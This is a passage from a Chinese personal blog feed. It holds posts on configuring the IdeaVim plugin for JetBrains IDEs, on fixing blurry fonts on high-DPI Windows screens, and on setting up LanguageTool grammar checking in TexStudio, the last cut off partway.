        <content type="html"><![CDATA[<blockquote><p>由于hexo的渲染机制，本文代码有问题，所以选择隐藏。</p></blockquote><p>作为一个半vimer：不想用纯vim+各种插件，但实现很喜欢vim的各种键位带来的便捷性。所以很久以前就是使用IDE+vim插件在使用。IDE当然是使用jetbrain家的了。今天就来介绍一下jb家可用的vim插件ideavim以及如何自定义配置ideavim。</p><p>hexo 显示尖括号有问题，导向github:</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L3JhdmVueHJ6LmdpdGh1Yi5pby9ibG9iL21hc3Rlci9zb3VyY2UvX3Bvc3RzL2lkZWF2aW0lRTklODUlOEQlRTclQkQlQUUlRTglQUYlQjQlRTYlOTglOEUubWQ=" title="https://github.com/ravenxrz/ravenxrz.github.io/blob/master/source/_posts/ideavim%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E.md">https://github.com/ravenxrz/ravenxrz.github.io/blob/master/source/_posts/ideavim%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E.md<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-安装ideavim"><a href="#1-安装ideavim" class="headerlink" title="1. 安装ideavim"></a>1. 安装ideavim</h2><p>安装就很简单了，File-&gt;Settings-&gt;Plugins即可。</p><p>如下图：</p><p><img data-src="https://pic.downk.cc/item/5e46653d48b86553ee1a2370.jpg"></p><p>安装后重启，默认就是vim了。vim的各种基础功能都可以正常使用。</p><p>下面来讲一下如何自定义适合自己的vim操作。</p><h2 id="2-ideavimrc配置"><a href="#2-ideavimrc配置" class="headerlink" title="2. ideavimrc配置"></a>2. ideavimrc配置</h2><p>如果你是Windows用户，请在当前用户的根目录下，建立.ideavimrc文件，如我的计算机用户名是Raven，则创建路劲如下：</p><p><img data-src="https://pic.downk.cc/item/5e46649748b86553ee19f21e.jpg"></p><p>如果是mac/linux用户，则创建路径为~/.ideavimrc。</p><p>创建好后，打开该文件，我们可对其进行一些通用的设置（为什么这里说是通用呢？因为ideavim可绑定ide的一些功能来使用）。如:</p><ul><li>设置相对行号: <code>set number</code></li><li>开启增量搜索：<code>set incsearch</code></li><li>开启搜索高亮: <code>set hlsearch</code></li><li>…</li></ul><p>我的基础配置项如下，可根据个人使用习惯进行配置：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; 显示当前模式</span></span><br><span class="line"><span class="string">set showmode</span></span><br><span class="line"><span class="string">&quot;</span> 共享系统粘贴板</span><br><span class="line"><span class="keyword">set</span> clipborad=unamed</span><br><span class="line"><span class="string">&quot; 打开行号</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">&quot;</span> 打开相对行号</span><br><span class="line"><span class="string">&quot; set relativenumber</span></span><br><span class="line"><span class="string">&quot;</span> 设置命令历史记录条数</span><br><span class="line"><span class="keyword">set</span> history=<span class="number">2000</span></span><br><span class="line"><span class="string">&quot; 关闭兼容vi</span></span><br><span class="line"><span class="string">set nocompatible</span></span><br><span class="line"><span class="string">&quot;</span> 开启语法高亮功能</span><br><span class="line">syntax enable</span><br><span class="line"><span class="string">&quot; 允许用指定语法高亮配色方案替换默认方案</span></span><br><span class="line"><span class="string">syntax on</span></span><br><span class="line"><span class="string">&quot;</span> 模式搜索实时预览,增量搜索</span><br><span class="line"><span class="keyword">set</span> incsearch</span><br><span class="line"><span class="string">&quot; 设置搜索高亮</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">&quot;</span> 忽略大小写 (该命令配合smartcase使用较好，否则不要开启)</span><br><span class="line"><span class="keyword">set</span> ignorecase</span><br><span class="line"><span class="string">&quot; 模式查找时智能忽略大小写</span></span><br><span class="line"><span class="string">set smartcase</span></span><br><span class="line"><span class="string">&quot;</span> vim自身命令行模式智能补全</span><br><span class="line"><span class="keyword">set</span> wildmenu</span><br><span class="line"><span class="string">&quot; 总是显示状态栏</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string">&quot;</span> 显示光标当前位置</span><br><span class="line"><span class="keyword">set</span> ruler</span><br><span class="line"><span class="string">&quot; 高亮显示当前行/列</span></span><br><span class="line"><span class="string">set cursorline</span></span><br><span class="line"><span class="string">&quot;</span><span class="keyword">set</span> cursorcolumn</span><br><span class="line"><span class="string">&quot; 禁止折行</span></span><br><span class="line"><span class="string">set nowrap</span></span><br><span class="line"><span class="string">&quot;</span> 将制表符扩展为空格</span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="string">&quot; 设置编辑时制表符占用空格数</span></span><br><span class="line"><span class="string">set tabstop=8</span></span><br><span class="line"><span class="string">&quot;</span> 设置格式化时制表符占用空格数</span><br><span class="line"><span class="keyword">set</span> shiftwidth=<span class="number">4</span></span><br><span class="line"><span class="string">&quot; 让 vim 把连续数量的空格视为一个制表符</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">&quot;</span> 基于缩进或语法进行代码折叠</span><br><span class="line"><span class="keyword">set</span> foldmethod=indent</span><br><span class="line"><span class="keyword">set</span> foldmethod=syntax</span><br><span class="line"><span class="string">&quot; 启动 vim 时关闭折叠代码</span></span><br><span class="line"><span class="string">set nofoldenable</span></span><br></pre></td></tr></table></figure><h3 id="2-1-leader键"><a href="#2-1-leader键" class="headerlink" title="2.1 leader键"></a>2.1 leader键</h3><p>现在开始讲第一个重点，<strong>leader键</strong>。稍微熟悉一点vim肯定是知道leader键的。leader键的作用相当于扩展了一个功能键位，使用leader键+其它组合键能够避免原来基础vim下的键位冲突。这样解释肯定让人感到很迷，简单的说来就是你设置一个leader键（比如 分号 ;)，然后通过这个分号+其它键可以映射成各种功能。举个例子：</p><p>设置leader键：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let mapleader&#x3D;&quot;;&quot;</span><br></pre></td></tr></table></figure><p>设置，通过 leader(即;)+t 实现跳转 (Ctrl + ])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;Leader&gt;t &lt;C-]&gt;</span><br></pre></td></tr></table></figure><p>现在你按 ; + t 就等同于 Ctrl +］。</p><p>这样可以自主映射成许多功能了，如：</p><ul><li>取消搜索后的高亮：<code>nnoremap &lt;silent&gt; &lt;Leader&gt;l :&lt;C-u&gt;nohlsearch&lt;CR&gt;&lt;C-l&gt;</code></li><li>跳转到上/下一个缓冲区（当然这个在ideavim中没有，纯vim中是有用的）:<code>nnoremap &lt;silent&gt; [b :w&lt;CR&gt;:bprevious&lt;CR&gt;</code>  <code>nnoremap &lt;silent&gt; ]b :w&lt;CR&gt;:bnext&lt;CR&gt;</code></li><li>…</li></ul><h3 id="2-2-配合IDE的action"><a href="#2-2-配合IDE的action" class="headerlink" title="2.2 配合IDE的action"></a>2.2 配合IDE的action</h3><p>我们可以配置ideavim，使得ideavim可以调用ide的各种各种。如run，debug，格式化代码等等。</p><p>ide的各个功能都对应有一个action，如格式化代码对应-&gt;<code>ReformatCode</code>，我们可以这样设置，将leader+f（按个人需要设置相关映射)和ReformatCode绑定在一起:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nnoremap &lt;Leader&gt;f :action ReformatCode&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>怎么去查这些action呢，输入:actionlist即可。将得到如下图：</p><p><img data-src="https://pic.downk.cc/item/5e466b2a48b86553ee1bf850.jpg"></p><p>或者你可以这个链接里面找相关的action，<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vcmF2ZW54cnovZTU3ODZiMGE1ZTMyZmI4YjIyMDhiZjUwZTMxNGFiNWI=" title="https://gist.github.com/ravenxrz/e5786b0a5e32fb8b2208bf50e314ab5b">https://gist.github.com/ravenxrz/e5786b0a5e32fb8b2208bf50e314ab5b<i class="fa fa-external-link"></i></span></p><p>下面给我的常用action映射配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&quot; 使用idea内部功能</span><br><span class="line">&quot; copy operation</span><br><span class="line">nnoremap &lt;Leader&gt;c :action $Copy&lt;CR&gt;</span><br><span class="line">&quot; paste operation</span><br><span class="line">nnoremap &lt;Leader&gt;v :action $Paste&lt;CR&gt;</span><br><span class="line">&quot; cut operation</span><br><span class="line">nnoremap &lt;Leader&gt;x :action $Cut&lt;CR&gt;</span><br><span class="line">&quot; Select All</span><br><span class="line">nnoremap &lt;Leader&gt;a :action $SelectAll&lt;CR&gt;</span><br><span class="line">&quot; reformat code</span><br><span class="line">nnoremap &lt;Leader&gt;f :action ReformatCode&lt;CR&gt;</span><br><span class="line">&quot; New File</span><br><span class="line">nnoremap &lt;Leader&gt;n :action NewFile&lt;CR&gt;</span><br><span class="line">&quot; 找到usage</span><br><span class="line">nnoremap &lt;Leader&gt;u :action FindUsages&lt;CR&gt;</span><br><span class="line">&quot; 调用idea的replace操作</span><br><span class="line">nnoremap &lt;Leader&gt;; :action Replace&lt;CR&gt;</span><br><span class="line">&quot; go to class</span><br><span class="line">nnoremap &lt;Leader&gt;gc :action GotoClass&lt;CR&gt;</span><br><span class="line">&quot; go to action</span><br><span class="line">nnoremap &lt;Leader&gt;ga :action GotoAction&lt;CR&gt;</span><br><span class="line">&quot; run</span><br><span class="line">nnoremap &lt;Leader&gt;r :action Run&lt;CR&gt;</span><br><span class="line">&quot; 显示当前文件的文件路径</span><br><span class="line">nnoremap &lt;Leader&gt;fp :action ShowFilePath&lt;CR&gt;</span><br><span class="line">&quot; 隐藏激活窗口</span><br><span class="line">nnoremap &lt;Leader&gt;h :action HideActiveWindow&lt;CR&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-ideavim的附加插件"><a href="#2-3-ideavim的附加插件" class="headerlink" title="2.3 ideavim的附加插件"></a>2.3 ideavim的附加插件</h3><p>ideavim中还可以开启其余四个插件。（其实是模拟的）</p><ul><li>easymotion（这个插件需要额外安装<span class="exturl" data-url="aHR0cHM6Ly9wbHVnaW5zLmpldGJyYWlucy5jb20vcGx1Z2luLzEzMzYwLWlkZWF2aW0tZWFzeW1vdGlvbi8=" title="https://plugins.jetbrains.com/plugin/13360-ideavim-easymotion/">IdeaVim-EasyMotion<i class="fa fa-external-link"></i></span> 和<span class="exturl" data-url="aHR0cHM6Ly9wbHVnaW5zLmpldGJyYWlucy5jb20vcGx1Z2luLzcwODYtYWNlanVtcC8=" title="https://plugins.jetbrains.com/plugin/7086-acejump/">AceJump<i class="fa fa-external-link"></i></span> ）</li><li>surround</li><li>multiple-cursors</li><li>commentary</li></ul><p>要开启任一个插件，只需要在.ideavimrc中输入 set xxx(如set surround)。</p><p>如何设置和使用，这里就粘贴官网的说明了：</p><ul><li>easymotion<ul><li>Setup:<ul><li>Install <span class="exturl" data-url="aHR0cHM6Ly9wbHVnaW5zLmpldGJyYWlucy5jb20vcGx1Z2luLzEzMzYwLWlkZWF2aW0tZWFzeW1vdGlvbi8=" title="https://plugins.jetbrains.com/plugin/13360-ideavim-easymotion/">IdeaVim-EasyMotion<i class="fa fa-external-link"></i></span> and <span class="exturl" data-url="aHR0cHM6Ly9wbHVnaW5zLmpldGJyYWlucy5jb20vcGx1Z2luLzcwODYtYWNlanVtcC8=" title="https://plugins.jetbrains.com/plugin/7086-acejump/">AceJump<i class="fa fa-external-link"></i></span> plugins.</li><li><code>set easymotion</code></li></ul></li><li>Emulates <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Vhc3ltb3Rpb24vdmltLWVhc3ltb3Rpb24=" title="https://github.com/easymotion/vim-easymotion">vim-easymotion<i class="fa fa-external-link"></i></span></li><li>Commands: All commands with the mappings are supported. See the <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXhQbDI5Mi9JZGVhVmltLUVhc3lNb3Rpb24jc3VwcG9ydGVkLWNvbW1hbmRz" title="https://github.com/AlexPl292/IdeaVim-EasyMotion#supported-commands">full list of supported commands<i class="fa fa-external-link"></i></span>.</li></ul></li><li>surround<ul><li>Setup: <code>set surround</code></li><li>Emulates <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Rwb3BlL3ZpbS1zdXJyb3VuZA==" title="https://github.com/tpope/vim-surround">vim-surround<i class="fa fa-external-link"></i></span></li><li>Commands: <code>ys</code>, <code>cs</code>, <code>ds</code>, <code>S</code></li></ul></li><li>multiple-cursors<ul><li>Setup: <code>set multiple-cursors</code></li><li>Emulates <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlcnJ5bWEvdmltLW11bHRpcGxlLWN1cnNvcnM=" title="https://github.com/terryma/vim-multiple-cursors">vim-multiple-cursors<i class="fa fa-external-link"></i></span></li><li>Commands: <code>&lt;A-n&gt;</code>, <code>&lt;A-x&gt;</code>, <code>&lt;A-p&gt;</code>, <code>g&lt;A-n&gt;</code></li></ul></li><li>commentary<ul><li>Setup: <code>set commentary</code></li><li>Emulates <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Rwb3BlL3ZpbS1jb21tZW50YXJ5" title="https://github.com/tpope/vim-commentary">commentary.vim<i class="fa fa-external-link"></i></span></li><li>Commands: <code>gcc</code>, <code>gc + motion</code>, <code>v_gc</code></li></ul></li></ul><p>就我个人而言，这几个插件能带来的效率都不算高。</p><h3 id="2-4-解决烦人的中英文切换问题"><a href="#2-4-解决烦人的中英文切换问题" class="headerlink" title="2.4 解决烦人的中英文切换问题"></a>2.4 解决烦人的中英文切换问题</h3><p>经常使用vim的人，一定会遇到中英文切换的问题。这里使用IdeaVimExtension插件可解决：</p><p><img data-src="https://pic.downk.cc/item/5e466d9f48b86553ee1ca262.jpg"></p><p>安装该插件后，在ideavimrc中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set keep-english-in-normal-and-restore-in-insert</span><br></pre></td></tr></table></figure><h2 id="3-所有配置"><a href="#3-所有配置" class="headerlink" title="3. 所有配置"></a>3. 所有配置</h2><p>我的所有配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">&quot; 显示当前模式</span><br><span class="line">set showmode</span><br><span class="line">&quot; 共享系统粘贴板</span><br><span class="line">set clipborad&#x3D;unamed</span><br><span class="line">&quot; 打开行号</span><br><span class="line">set number</span><br><span class="line">&quot; 打开相对行号</span><br><span class="line">&quot; set relativenumber</span><br><span class="line">&quot; 设置命令历史记录条数</span><br><span class="line">set history&#x3D;2000</span><br><span class="line">&quot; 关闭兼容vi</span><br><span class="line">set nocompatible</span><br><span class="line">&quot; 开启语法高亮功能</span><br><span class="line">syntax enable</span><br><span class="line">&quot; 允许用指定语法高亮配色方案替换默认方案</span><br><span class="line">syntax on</span><br><span class="line">&quot; 模式搜索实时预览,增量搜索</span><br><span class="line">set incsearch</span><br><span class="line">&quot; 设置搜索高亮</span><br><span class="line">set hlsearch</span><br><span class="line">&quot; 忽略大小写 (该命令配合smartcase使用较好，否则不要开启)</span><br><span class="line">set ignorecase</span><br><span class="line">&quot; 模式查找时智能忽略大小写</span><br><span class="line">set smartcase</span><br><span class="line">&quot; vim自身命令行模式智能补全</span><br><span class="line">set wildmenu</span><br><span class="line">&quot; 总是显示状态栏</span><br><span class="line">set laststatus&#x3D;2</span><br><span class="line">&quot; 显示光标当前位置</span><br><span class="line">set ruler</span><br><span class="line">&quot; 高亮显示当前行&#x2F;列</span><br><span class="line">set cursorline</span><br><span class="line">&quot;set cursorcolumn</span><br><span class="line">&quot; 禁止折行</span><br><span class="line">set nowrap</span><br><span class="line">&quot; 将制表符扩展为空格</span><br><span class="line">set expandtab</span><br><span class="line">&quot; 设置编辑时制表符占用空格数</span><br><span class="line">set tabstop&#x3D;8</span><br><span class="line">&quot; 设置格式化时制表符占用空格数</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">&quot; 让 vim 把连续数量的空格视为一个制表符</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">&quot; 基于缩进或语法进行代码折叠</span><br><span class="line">set foldmethod&#x3D;indent</span><br><span class="line">set foldmethod&#x3D;syntax</span><br><span class="line">&quot; 启动 vim 时关闭折叠代码</span><br><span class="line">set nofoldenable</span><br><span class="line"></span><br><span class="line">&quot; 设置前导键</span><br><span class="line">let mapleader&#x3D;&quot;;&quot;</span><br><span class="line">&quot; 暂时取消搜索高亮快捷键</span><br><span class="line">nnoremap &lt;silent&gt; &lt;Leader&gt;l :&lt;C-u&gt;nohlsearch&lt;CR&gt;&lt;C-l&gt;</span><br><span class="line"></span><br><span class="line">&quot; 移动相关</span><br><span class="line">&quot; 前一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; [b :w&lt;CR&gt;:bprevious&lt;CR&gt;</span><br><span class="line">&quot; 后一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; ]b :w&lt;CR&gt;:bnext&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键到行首和行尾</span><br><span class="line">map H ^</span><br><span class="line">map L $</span><br><span class="line">&quot; 定义快速跳转</span><br><span class="line">nmap &lt;Leader&gt;t &lt;C-]&gt;</span><br><span class="line">&quot; 定义快速跳转回退</span><br><span class="line">nmap &lt;Leader&gt;T &lt;C-t&gt;</span><br><span class="line">&quot; 标签页后退 ---标签页前进是gt</span><br><span class="line">nmap gn gt</span><br><span class="line">nmap gp gT</span><br><span class="line"></span><br><span class="line">&quot; 文件操作相关</span><br><span class="line">&quot; 定义快捷键关闭当前分割窗口</span><br><span class="line">nmap &lt;Leader&gt;q :q&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键保存当前窗口内容</span><br><span class="line">nmap &lt;Leader&gt;w :w&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot; 窗口操作相关</span><br><span class="line">map &lt;C-j&gt; &lt;C-W&gt;j</span><br><span class="line">map &lt;C-k&gt; &lt;C-W&gt;k</span><br><span class="line">map &lt;C-h&gt; &lt;C-W&gt;h</span><br><span class="line">map &lt;C-l&gt; &lt;C-W&gt;l</span><br><span class="line"></span><br><span class="line">&quot; 使用idea内部功能</span><br><span class="line">&quot; copy operation</span><br><span class="line">nnoremap &lt;Leader&gt;c :action $Copy&lt;CR&gt;</span><br><span class="line">&quot; paste operation</span><br><span class="line">nnoremap &lt;Leader&gt;v :action $Paste&lt;CR&gt;</span><br><span class="line">&quot; cut operation</span><br><span class="line">nnoremap &lt;Leader&gt;x :action $Cut&lt;CR&gt;</span><br><span class="line">&quot; Select All</span><br><span class="line">nnoremap &lt;Leader&gt;a :action $SelectAll&lt;CR&gt;</span><br><span class="line">&quot; reformat code</span><br><span class="line">nnoremap &lt;Leader&gt;f :action ReformatCode&lt;CR&gt;</span><br><span class="line">&quot; New File</span><br><span class="line">nnoremap &lt;Leader&gt;n :action NewFile&lt;CR&gt;</span><br><span class="line">&quot; 找到usage</span><br><span class="line">nnoremap &lt;Leader&gt;u :action FindUsages&lt;CR&gt;</span><br><span class="line">&quot; 调用idea的replace操作</span><br><span class="line">nnoremap &lt;Leader&gt;; :action Replace&lt;CR&gt;</span><br><span class="line">&quot; go to class</span><br><span class="line">nnoremap &lt;Leader&gt;gc :action GotoClass&lt;CR&gt;</span><br><span class="line">&quot; go to action</span><br><span class="line">nnoremap &lt;Leader&gt;ga :action GotoAction&lt;CR&gt;</span><br><span class="line">&quot; run</span><br><span class="line">nnoremap &lt;Leader&gt;r :action RunClass&lt;CR&gt;</span><br><span class="line">&quot; 显示当前文件的文件路径</span><br><span class="line">nnoremap &lt;Leader&gt;fp :action ShowFilePath&lt;CR&gt;</span><br><span class="line">&quot; 隐藏激活窗口</span><br><span class="line">nnoremap &lt;Leader&gt;h :action HideActiveWindow&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot; 中英文自动切换</span><br><span class="line">set keep-english-in-normal-and-restore-in-insert</span><br><span class="line"></span><br><span class="line">&quot; other vim plugins</span><br><span class="line">&quot; comment plugin</span><br><span class="line">set commentary</span><br><span class="line">&quot; surround plugin</span><br><span class="line">set surround</span><br><span class="line">&quot; easymotion</span><br><span class="line">set easymotion</span><br><span class="line"></span><br><span class="line">&quot; 一些有用的快捷键，但是没做映射</span><br><span class="line">&quot; open project file tree ---------- alt + 1</span><br><span class="line">&quot; open terminal window   ---------- alt + F12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
            <tag> idea </tag>
            
            <tag> ideavim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Windows高分屏字体模糊问题</title>
      <link href="/archives/bd948cbe.html"/>
      <url>/archives/bd948cbe.html</url>
      
        <content type="html"><![CDATA[<p>给旧笔记本换了个高分屏，显示效果比以前好多了，但是部分应用却莫名有些模糊。如Understand代码分析软件。google一波，找到了解决办法。如下：</p><p>打开Windows设置-&gt;显示-&gt;缩放与布局-&gt;高级缩放设置，<strong>手动输入你的缩放比</strong>。我是1080p的屏幕，所以设置的是125%的缩放比。然后注销重启即可。</p><p><img data-src="https://pic.downk.cc/item/5e188db37f9a96fec1642ba7.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高分屏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TexStudio语法检查插件--Language Tools安装教程</title>
      <link href="/archives/a05d8f5e.html"/>
      <url>/archives/a05d8f5e.html</url>
      
        <content type="html"><![CDATA[<p>今天给大家介绍如何在TexStudio中启用Language Tools插件。</p><p>前提,以下所有软件请都升级到最新版本。</p><ul><li><span class="exturl" data-url="aHR0cDovL3RleHN0dWRpby5zb3VyY2Vmb3JnZS5uZXQv" title="http://texstudio.sourceforge.net/">TexStudio<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpbnFpbmd3YW5nL2FydGljbGUvZGV0YWlscy81NDU4MzU0MQ==" title="https://blog.csdn.net/yinqingwang/article/details/54583541">Language Tools<i class="fa fa-external-link"></i></span>,下载后缀为.zip的文件。</li><li><span class="exturl" data-url="aHR0cHM6Ly9leHRlbnNpb25zLmxpYnJlb2ZmaWNlLm9yZy9leHRlbnNpb25zL2VuZ2xpc2gtZGljdGlvbmFyaWVz" title="https://extensions.libreoffice.org/extensions/english-dictionaries">English dictionary<i class="fa fa-external-link"></i></span>，后缀为oxt, 此文件下载后放置于你安装texstudio路径下的dictionaries路径下，如我的是<code>D:\texstudio\dictionaries</code>。</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9qYXZhL2phdmFzZS9kb3dubG9hZHMvaW5kZXguaHRtbA==" title="https://www.oracle.com/technetwork/java/javase/downloads/index.html">Jdk<i class="fa fa-external-link"></i></span>,jdk安装LTS的版本就好，不一定需要最新。</li></ul><a id="more"></a><h2 id="1-Java环境安装"><a href="#1-Java环境安装" class="headerlink" title="1. Java环境安装"></a>1. Java环境安装</h2><p>下载好JDK并安装后，需要配置环境变量。右键”此电脑”，然后如图操作：</p><p><img data-src="https://pic.superbed.cn/item/5e159d7876085c32896a86de.jpg"></p><p>然后，继续新建变量，变量名和变量值如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CLASSPATH</span><br><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5e159dab76085c32896a9609.jpg"></p><p>接着找到Path变量，双击新加如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\bin</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5e159dee76085c32896a9e8a.jpg"></p><p>现在可以打开cmd输入java -version验证是否安装成功，如图:</p><p><img data-src="https://pic.superbed.cn/item/5e159e3576085c32896aa560.jpg"></p><h2 id="2-Language-Tools配置"><a href="#2-Language-Tools配置" class="headerlink" title="2. Language Tools配置"></a>2. Language Tools配置</h2><p>把你下载好的Language Tools（以下简称“LT”）解压到任意路径，打开cmd并进入到该路径，然后执行以下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar languagetool.jar</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5e159ec176085c32896ac4ba.jpg"></p><p><img data-src="https://pic.superbed.cn/item/5e159ee476085c32896ac882.jpg"></p><p>如果你的LT界面和我不一样，不用管，我只是换了各主题而已。</p><p>点击Text Checking-&gt;选项-&gt;General,选择运行服务器端口:</p><p><img data-src="https://pic.superbed.cn/item/5e159f2e76085c32896ad3f0.jpg"></p><p>现在打开浏览器，输入”<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo4MDgxL3YyL2NoZWNrP2xhbmd1YWdlPWVuJmFtcDt0ZXh0PXlvdStpcytnaXJs" 